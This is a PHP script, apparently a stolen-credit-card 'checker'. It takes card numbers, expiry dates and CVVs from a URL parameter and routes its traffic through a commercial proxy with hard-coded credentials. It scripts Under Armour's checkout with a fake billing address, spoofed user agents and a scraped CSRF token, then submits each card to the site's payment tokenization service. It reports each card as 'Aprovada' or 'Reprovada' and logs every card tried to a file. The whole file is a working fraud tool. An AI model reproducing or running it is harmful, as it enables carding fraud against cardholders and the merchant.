<?php

error_reporting(0);

function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$lista = $_GET['lista'];
$lista = str_replace(array(':',";","|",",","=>","-"," ","%20",'%20','/'), "|", $lista);
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

$email = 'cs'.rand(11111, 99999).'@gmail.com';

$random3 = substr(str_shuffle(str_repeat("sjonasmillertomasricardolimaalmeoida", 9)), 0, 9);
$random7 = substr(str_shuffle(str_repeat("123456789", 4)), 0, 4);

$random9 = substr(str_shuffle(str_repeat("013456789", 3)), 0, 3);
$random8 = substr(str_shuffle(str_repeat("123456789", 1)), 0, 1);


$username = 'lum-customer-hl_03cedff3-zone-data_center';
$password = 'k0us663hu559';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$proxy = ''.$super_proxy.':'.$port.'';
$pass = ''.$username.':'.$password.'';

$cookie = getcwd().'/'.rand(000000, 999999).'.txt';

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_URL, 'https://api.tinkoff.ru/v1/brand_by_bin?bin='.substr($cc , 0 , 6).'');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
$pegarbin = curl_exec($ch);

$ccoutry = getstr($pegarbin,'"country":"','"',1);
$paysyst = getstr($pegarbin,'"paymentSystem":"','"',1);
$bbank = getstr($pegarbin,'"bank":"','"',1);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.underarmour.com/on/demandware.store/Sites-US-Site/en_US/Cart-AddProduct');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.$random9.'.36 (KHTML, like Gecko) Chrome/91.0.'.$random7.'.'.$random9.' Safari/'.$random9.'.36 Edg/91.0.'.$random9.'.70');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'pid=883096898849&quantity=1&options=%5B%5D');
$guizin = curl_exec($ch);


$uiis = getStr($guizin,'"uuid": "','"');

$id = getStr($guizin,'"id": "','"');

$UID = getStr($guizin,'"UUID": "','"');

$shipmentUUID = getStr($guizin,'"shipmentUUID": "','"');

$pliUUID = getStr($guizin,'"pliUUID": "','"');

$cart = getStr($guizin,'"pliUUID": "','"');

$datapid = getStr($guizin,'" data-pid=\"','\"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.underarmour.com/en-us/Checkout-Begin');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.$random9.'.36 (KHTML, like Gecko) Chrome/91.0.'.$random7.'.'.$random9.' Safari/'.$random9.'.36 Edg/91.0.'.$random9.'.70');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
$guizin4 = curl_exec($ch);

$shipuid = getStr($guizin4,'" data-shipment-summary="','"');

$csrftoken = getStr($guizin4,'"csrf_token" value="','"');

$fttt = ''.$csrftoken.'';
$encodedurl = urlencode($fttt);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.underarmour.com/on/demandware.store/Sites-US-Site/en_US/CheckoutServices-ValidateBilling');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.$random9.'.36 (KHTML, like Gecko) Chrome/91.0.'.$random7.'.'.$random9.' Safari/'.$random9.'.36 Edg/91.0.'.$random9.'.70');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dwfrm_billing_addressFields_firstName=guilherme&dwfrm_billing_addressFields_lastName=santos&dwfrm_billing_addressFields_address1=45+Street+A&dwfrm_billing_addressFields_address2=&dwfrm_billing_addressFields_city=Ray+City&dwfrm_billing_addressFields_states_stateCode=GA&dwfrm_billing_addressFields_postalCode=31645-2068&dwfrm_billing_addressFields_country=US&csrf_token='.$encodedurl.'&localizedNewAddressTitle=New+Address&dwfrm_billing_shippingAddressUseAsBillingAddress=true&dwfrm_billing_paymentMethod=Paymetric&dwfrm_paymetric_payload=&dwfrm_paymetric_cardType=&dwfrm_paymetric_lastFour=&dwfrm_paymetric_ccBinRange=&dwfrm_paymetric_expiresMonth=&dwfrm_paymetric_expiresYear=');
$guizin7 = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://tokens.underarmour.com/v1.0/authorization');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.$random9.'.36 (KHTML, like Gecko) Chrome/91.0.'.$random7.'.'.$random9.' Safari/'.$random9.'.36 Edg/91.0.'.$random9.'.70');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_HTTPHEADER, array('POST /v1.0/authorization HTTP/1.1',
'Host: tokens.underarmour.com',
'Connection: keep-alive',
'sec-ch-ua: " Not;A Brand";v="99", "Microsoft Edge";v="91", "Chromium";v="91"',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.$random9.'.36 (KHTML, like Gecko) Chrome/91.0.'.$random7.'.'.$random9.' Safari/'.$random9.'.36 Edg/91.0.'.$random9.'.70',
'content-type: application/json',
'Accept: */*',
'Origin: https://tokens.underarmour.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://tokens.underarmour.com/payment-sandbox/view.html?referrer=https%3A%2F%2Fwww.underarmour.com%2F',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"currency":"USD","billingAddress":{"line1":"45 Street A","line2":"","city":"Ray City","region":"GA","postal":"31645-2068","country":"US"},"shippingAddress":{"line1":"45 Street A","line2":"","city":"Ray City","region":"GA","postal":"31645-2068","country":"US"},"payment":{"type":"CreditCard","expiresMonth":"'.$mes.'","expiresYear":"'.$ano.'","cardType":"VISA","nameOnCard":"guilherme santos","cardNumber":"'.$cc.'","cvv":"'.$cvv.'"}}');
$guizin8 = curl_exec($ch);

$codi2 = getStr($guizin8,'"error":"','"');

$codi = getStr($guizin8,'"code":"','"');



if (stripos($guizin8, "CreditCardTokenized")) {

echo "Aprovada 👍 $cc|$mes|$ano|$cvv ( $ccoutry $paysyst $bbank ) ( Retorno: Autorizada ) @LindoFuLL";

}elseif(strpos($guizin8, "cvv_failure")){

  echo "Aprovada $cc|$mes|$ano|$cvv ( $ccoutry $paysyst $bbank ) (cvv_failure) @LindoFuLL";

}elseif(strpos($guizin8, "Cartão inválido ou não verificado")){

  echo "Reprovada $cc|$mes|$ano|$cvv ( $ccoutry $paysyst $bbank ) (Cartão inválido ou não verificado!) @LindoFuLL";
}else{
  echo "Reprovada $cc|$mes|$ano|$cvv ( $ccoutry $paysyst $bbank ) ( $codi )( $codi2 ) @LindoFuLL";
}

curl_close($ch);
unlink($cookie);

$arquivo = 'lindofull.txt';
    $fp = fopen($arquivo, 'a+');
    fwrite($fp, 'Logs=> '.$lista.' '.$codi."\n\r");
    fclose($fp);

?>
